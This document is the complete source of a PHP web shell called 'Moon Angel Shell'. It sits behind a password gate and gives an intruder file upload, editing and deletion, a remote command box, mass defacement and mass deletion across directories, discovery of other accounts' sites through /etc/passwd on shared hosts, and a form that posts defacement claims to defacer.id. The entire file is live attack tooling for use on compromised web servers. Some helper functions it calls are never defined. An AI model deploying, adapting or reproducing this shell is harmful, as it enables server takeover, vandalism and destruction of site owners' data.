<?php
@session_start();
@set_time_limit(0);


@$pass = $_POST['pass'];
$chk_login = true;
$username = "moon";
$password = "mati";


if($pass == $password)
{
 $_SESSION['nst'] = "$pass";
}

if($chk_login == true)
{
 if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
 {
 die("
 <title></title>
<center><font face= audiowide size=8><font color=yellow>[<font color=gold>#] Moon<font color=yellow>Angel <font color=gold> Shell<font color=yellow> [<font color=gold>#]<br><br>
  <center><body bgcolor=black><center><br>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%><br><br>
  <table width=100 bgcolor=black border=6 bordercolor=lime><tr><td>
  <font size=1 face=lobster><center>
  	<img src=https://thumbs.dreamstime.com/b/winged-angel-moon-holds-her-hands-87038631.jpg height=500>
  <b></font></a></b>
  </center>
  <form method=post>
  <font size=3 color=cyan><strong><br><center>Hidup seperti bajingan ðŸ™‚
</center></strong><br> <font color=yellow><marquee direction=right scrollamount=100><font color=gold>_________</font><font color=yellow>_________</font><font color=gold>______</font> <br></marquee><br><br>
  <center><input type=password name=pass size=30>
  </form><br><br>
  <b><font color=white>YOUR IP</b> ".$_SERVER["REMOTE_ADDR"]."</center>
 <font color=yellow><marquee scrollamount=100><font color=gold>_________</font><font color=yellow>_________</font><font color=gold>______</font> <br>
  </td></tr></table>
  </td></tr></table><br><font color=white style='text-shadow: 0 0 20px red, 0 0 5px red, 0 0 7px red, 0 0 4px red; font-weight:bold: red;font-size:20px'><br><i>And404_ &copy; 2021</font>
  ");
 }
}


set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
	<link href="https://fonts.googleapis.com/css?family=Audiowide|Space+Mono" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Jolly+Lodger" rel="stylesheet" type="text/css">
<title></title>
<style>
body{
font-family: "Rye", jolly lodger;
background-image: url("https://f.top4top.io/p_1994xl1q41.jpg");
color: white;
background-position: center;
background-size: cover;
background-attachment: fixed;
background-repeat : no-repeat;
font-size: 14px;
font-color:white;
width: 100%;
}
 #content tr:hover{
text-shadow:0px 0px 1px #000000;
}
#content tr:hover{
background-color: cyan;
text-shadow:0px 0px 10px white;
}
#content .first{
background-color: lime;
}
#content .first:hover{
background-color: red;
text-shadow:0px 0px 1px #FF4C00;
}
table{
border: 6px #ffffff dotted;
}
H1{
font-family: "Rancho", jolly lodger;
}
a{
color: #ffffff;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #FCFF00 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<center><font size=20><font color=red><center>-=[<font color=cyan>Moon </font><font color=lime>Angel</font><font color=yellow> Shell</font><font color=red>]=-</font></center></H1></font></font>
<body class="  pace-done" bgcolor="black"><div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="width: 100%;">
<table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color=lime><i>
Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if (isset($_GET['AngellMass'])) {
echo "<center><form method='POST'><br>Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>File Name : <input type='text' name='file_name' value='miaw.php'><br><br><br>Your Script : <br><textarea style='width: 300px; height: 100px;' name='index'>Hacked By Senpai</textarea><br><input type='submit' value='Submit'></form></center><br><br>";
}
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: lime'>Done</span><br>";
                }
        endforeach;
}if (isset($_GET['bunuh'])) {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><font color=red size=3>shell telah dihapus<br>sayonara onichan</center></center>');
		else
			echo '<center>unlink failed!</center>';
			}
			elseif($_GET['do'] == 'angell') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='notiper' size='50' value='x'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='x'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$notiper = $_POST['notiper'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://defacer.id/archive/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$notiper";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}
			elseif($_GET['do'] == 'crazyxerror') {
				echo '<center><hr><img src=https://i.ibb.co/GCmnzXQ/Untitled-1.png height=100><br><font size=2 color=white>Create By And404_<br>SABUNMANDI CYBER TEAM<br><a href=https://www.facebook.com/restu.irfansyah.12>want to be friends? click me<hr></font></center>';
} elseif($_GET['do'] == 'moon') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
}if(isset($_GET['cegns'])) {
	echo "<i><form method='post'>
	<font color=aqua style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
	<input type='text' size='20' height='10' name='fjr'><input type='submit' name='do_fjr' value='>>'>
	</form>";
	if($_POST['do_fjr']) {
		echo "<pre>".exe($_POST['fjr'])."</pre>";
		}
}if (isset($_GET['crazyJumping'])) {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$url_user'><font color=#18BC9C>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$url_user'><font color=#18BC9C>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" class="btn btn-success btn-sm" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$web_vh'><font color=#18BC9C>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$web_vh'><font color=#18BC9C>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$user_jumping_dir'><font color=#18BC9C>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#18BC9C>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">SUCCESS</font><br />';
}else{
echo '<font color="red">ERROR</font><br />';
}

}
echo '<i><font color=lime>'.php_uname().'<br>  <b><font color=aqua>your IP</b> '.$_SERVER['REMOTE_ADDR'].'</b><br>';
echo '<i><font color=aqua>code &copy; '.date('Y').' - <a><font color=pink>And404_</font><center></a>';
echo '<form enctype="multipart/form-data" method="POST"><hr>
<input type="file" name="file" />
<input type="submit" value="UPLOAD" />
</form><hr><ul><center><br>
<a href=?><input type="submit" value="HOME" /> </form>
<a href=?AngellMass><input type="submit" value="MASS DEFACE" /></form>
<a href=?dir=$dir&do=moon><input type="submit" value="MASS DELETE" /></from><br><br>
<a href=?cegns><input type="submit" value="COMMAND" /></from>
<a href=?crazyJumping><input type="submit" value="JUMPING" /></form>
<a href=?dir=$dir&do=crazyxerror><input type="submit" value="ABOUT" /></from>
<a href=?dir=$dir&do=angell><input type="submit" value="DEFACER.ID" /></from>
<a href=?bunuh><input type="submit" value="KILL" /></form></a></center>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">sucess</font><br />';
}else{
echo '<font color="red">error</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">sucess</font><br />';
}else{
echo '<font color="red">error</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">sucess</font><br />';
}else{
echo '<font color="red">error</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">sucess</font><br />';
}else{
echo '<font color="red">error</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><font color=black><center>Name</center></td>
<td><font color=black><center>Size</center></td>
<td><font color=black><center>Permissions</center></td>
<td><font color=black><center>Options</center></td></font>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"selct\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">>\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"select\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">>\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
	

}
echo '<center><br><font color=white>©2021 code by And404_
</BODY><font color=red>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms 
& 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
